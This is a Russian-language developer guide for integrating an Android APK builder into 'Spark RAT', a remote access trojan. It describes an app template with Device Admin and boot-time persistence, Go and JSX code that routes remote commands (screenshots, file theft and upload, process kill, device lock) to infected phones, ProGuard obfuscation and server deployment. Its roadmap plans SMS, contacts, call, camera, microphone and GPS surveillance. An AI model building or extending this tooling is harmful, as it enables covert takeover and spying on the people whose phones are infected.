# Интеграция Android Builder в существующий Spark

## Обзор

Данный файл содержит инструкции по интеграции Android Builder в существующий веб-интерфейс Spark RAT.

## Что было добавлено

### 1. Новые файлы и директории:

```
android-builder/
├── android_generator.jsx          # React компонент для Android генерации
├── android_builder_api.py          # Python Flask API для сборки APK
├── requirements.txt                # Python зависимости
├── start_builder.sh               # Скрипт запуска API
├── build_android.sh               # Скрипт сборки APK
├── README.md                      # Документация Android Builder
├── API_TESTING.md                 # Примеры API запросов
└── INTEGRATION.md                 # Этот файл

android_template/                  # Шаблон Android проекта
├── app/
│   ├── src/main/java/com/spark/android/
│   │   ├── SparkConfig.java       # Конфигурация (генерируется)
│   │   ├── SparkService.java      # Основной сервис
│   │   ├── HttpClient.java        # HTTP клиент
│   │   ├── DeviceInfoCollector.java # Сбор информации
│   │   ├── CommandProcessor.java  # Обработка команд
│   │   ├── MainActivity.java      # Главная активность
│   │   ├── SparkAdminReceiver.java # Device Admin
│   │   └── BootReceiver.java      # Автозапуск
│   ├── src/main/AndroidManifest.xml
│   ├── src/main/res/              # Ресурсы
│   └── build.gradle              # Конфигурация сборки
├── build.gradle                   # Основной build файл
├── settings.gradle                # Настройки проекта
├── gradle.properties             # Свойства Gradle
└── gradlew                       # Gradle Wrapper
```

### 2. Обновленные существующие файлы:

- `web/src/config/prebuilt.json` - добавлена опция Android
- `README.md` - добавлена информация об Android поддержке
- `modules/modules.go` - добавлены Android-специфичные поля
- `client/core/android.go` - новый файл для Android команд

## Интеграция в веб-интерфейс

### Вариант 1: Отдельный Android Builder

1. **Запустите Android Builder API:**
   ```bash
   cd android-builder
   ./start_builder.sh
   ```

2. **Откройте веб-интерфейс:**
   ```
   http://localhost:8080
   ```

3. **Используйте отдельный интерфейс для генерации Android APK**

### Вариант 2: Интеграция в основной интерфейс

#### Обновите `web/src/components/generate/generate.jsx`:

```jsx
// Добавьте в начало файла
import AndroidGenerator from './android-generator';

// В компоненте Generate добавьте:
const [showAndroidGenerator, setShowAndroidGenerator] = useState(false);

// В JSX добавьте кнопку:
{this.state.platform === 'android' && (
  <Button 
    type="primary" 
    onClick={() => setShowAndroidGenerator(true)}
    loading={this.state.loading}
  >
    Создать Android APK
  </Button>
)}

// Добавьте модальное окно:
<AndroidGenerator
  open={showAndroidGenerator}
  onCancel={() => setShowAndroidGenerator(false)}
  onSuccess={() => setShowAndroidGenerator(false)}
/>
```

#### Обновите API маршруты:

В `server/api/routes.go` добавьте:

```go
// Добавить в импорты
_ "github.com/yourusername/spark/client/core"

// В функции SetupRoutes
android := router.Group("/api/android")
{
    android.POST("/generate", android.GenerateAPK)
    android.GET("/download/:filename", android.DownloadAPK)
    android.DELETE("/cleanup", android.CleanupOldAPKs)
}
```

## Обновление серверного кода

### 1. Добавьте обработку Android команд

В `server/api/handlers.go`:

```go
func HandleDeviceAction(c *gin.Context) {
    // Существующий код...
    
    // Добавьте проверку для Android
    if device.OS == "android" {
        switch action {
        case "screenshot", "file/list", "file/get", "file/upload", "file/remove",
             "process/list", "process/kill", "lock", "restart", "shutdown":
            core.HandleAndroidCommands(c)
            return
        }
    }
}
```

### 2. Обновите Device модель

В `client/core/device.go`:

```go
type Device struct {
    // Существующие поля...
    
    // Добавьте Android-специфичные поля
    Battery      *int    `json:"battery,omitempty"`
    StorageType  string  `json:"storage_type,omitempty"`
    NetworkType  string  `json:"network_type,omitempty"`
    AndroidVersion string `json:"android_version,omitempty"`
}
```

## Настройка среды разработки

### 1. Установите зависимости Python:
```bash
cd android-builder
pip install -r requirements.txt
```

### 2. Установите Android SDK:
```bash
# Скачайте Android Studio или SDK Tools
# Установите ANDROID_HOME
export ANDROID_HOME=/path/to/android-sdk
export PATH=$PATH:$ANDROID_HOME/tools:$ANDROID_HOME/platform-tools
```

### 3. Установите зависимости Node.js:
```bash
cd web
npm install
```

## Тестирование

### 1. Запустите основной сервер Spark:
```bash
go run main.go
```

### 2. Запустите Android Builder API:
```bash
cd android-builder
python android_builder_api.py
```

### 3. Соберите тестовый APK:
```bash
cd android_builder
./build_android.sh
```

### 4. Протестируйте API:
```bash
# Смотрите android-builder/API_TESTING.md для примеров
```

## Развертывание в продакшене

### 1. Настройте HTTPS для Android Builder API

### 2. Создайте systemd сервис для Android Builder:

```ini
# /etc/systemd/system/spark-android-builder.service
[Unit]
Description=Spark Android Builder API
After=network.target

[Service]
Type=simple
User=spark
WorkingDirectory=/opt/spark/android-builder
ExecStart=/usr/bin/python3 android_builder_api.py
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
```

### 3. Настройте nginx прокси:

```nginx
server {
    listen 8080;
    server_name your-domain.com;
    
    location /android/ {
        proxy_pass http://localhost:8081/;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }
}
```

### 4. Настройте SSL сертификат:
```bash
certbot --nginx -d your-domain.com
```

## Безопасность

### 1. Используйте подпись APK:
- Создайте собственный keystore
- Не используйте debug подпись в продакшене

### 2. Обфускация кода:
- Включите ProGuard в release сборке
- Минимизируйте код

### 3. Сетевая безопасность:
- Используйте HTTPS для всех запросов
- Реализуйте rate limiting
- Логируйте все API вызовы

### 4. Контроль доступа:
- Добавьте дополнительную аутентификацию для Android Builder
- Ограничьте доступ к API генерации

## Мониторинг

### 1. Логи Android Builder:
```bash
journalctl -u spark-android-builder -f
```

### 2. Мониторинг сборки APK:
- Отслеживайте размер файлов
- Мониторьте время сборки
- Логируйте ошибки

### 3. Мониторинг Android устройств:
- Отслеживайте статус подключения
- Логируйте команды и результаты
- Мониторьте производительность

## Troubleshooting

### Частые проблемы:

1. **"Android SDK not found"**
   ```bash
   echo $ANDROID_HOME
   ls $ANDROID_HOME/platforms
   ```

2. **"Build failed"**
   ```bash
   cd android_template
   ./gradlew assembleRelease --stacktrace
   ```

3. **"Permission denied"**
   ```bash
   chmod +x gradlew
   chmod +x build_android.sh
   ```

4. **"Network timeout"**
   - Проверьте подключение к интернету
   - Увеличьте timeout в android_builder_api.py

### Логи и отладка:

1. **Android устройство:**
   ```bash
   adb logcat | grep Spark
   ```

2. **Android Builder API:**
   ```bash
   python android_builder_api.py  # логи в консоли
   ```

3. **Основной сервер:**
   ```bash
   tail -f logs/spark.log
   ```

## Поддержка

Если у вас возникли проблемы с интеграцией:

1. Проверьте логи
2. Убедитесь в правильности настройки окружения
3. Проверьте сетевые настройки
4. Обратитесь к документации Android SDK

## Дальнейшее развитие

### Возможные улучшения:

1. **Автоматическая сборка** при изменениях кода
2. **CI/CD интеграция** с GitHub Actions
3. **Веб-интерфейс** для мониторинга сборок
4. **Множественная архитектура** (ARM, x86)
5. **Автоматическое тестирование** APK
6. **Поддержка Android TV** и других форм-факторов

### Новые команды:

1. **SMS управление** - чтение/отправка SMS
2. **Контакты** - работа с телефонной книгой
3. **Звонки** - управление вызовами
4. **Камера** - фото/видео съемка
5. **Микрофон** - запись звука
6. **Геолокация** - GPS координаты
7. **Уведомления** - системные уведомления